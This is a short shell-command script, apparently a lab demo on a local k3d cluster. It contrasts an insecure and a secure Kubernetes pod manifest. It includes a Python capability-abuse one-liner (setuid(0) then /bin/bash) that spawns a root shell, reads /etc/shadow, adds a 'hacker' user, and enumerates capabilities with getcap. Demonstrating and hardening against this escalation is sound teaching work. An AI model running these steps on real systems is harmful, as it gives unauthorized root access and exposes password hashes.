@@ -1,0 +1,40 @@
+# Build image
+docker build . -t custom-python:local
+
+# Apply k8s manifest
+k apply -f insecure.yaml
+
+# Import image
+k3d image import custom-python:local -c container-attack
+
+# Connect to container
+k exec -it ubuntu -- bash
+
+# No fun
+cat /etc/shadow
+apt-get install -y nmap
+useradd hacker
+
+# Fun & profit
+./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# More fun
+cat /etc/shadow
+apt-get install -y nmap
+useradd hacker
+
+# Cleanup
+k delete pod ubuntu --force
+
+# Apply k8s manifest
+k apply -f secure.yaml
+
+# No fun & no profit
+./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# Cleanup
+k delete pod ubuntu --force
+
+# Misc
+getcap -r / 2>/dev/null
+capsh --print
